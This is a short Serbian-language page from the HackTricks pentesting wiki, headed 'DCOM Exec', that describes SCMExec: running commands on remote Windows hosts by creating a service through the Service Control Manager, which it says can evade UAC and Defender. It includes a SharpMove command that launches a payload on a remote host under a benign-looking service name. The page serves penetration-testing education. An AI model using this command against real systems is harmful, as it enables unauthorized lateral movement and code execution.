# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** je tehnika za izvršavanje komandi na udaljenim sistemima korišćenjem Service Control Manager-a (SCM) za kreiranje servisa koji izvršava komandu. Ovaj metod može zaobići neke bezbednosne kontrole, kao što su User Account Control (UAC) i Windows Defender.

## Alati

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Reference

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
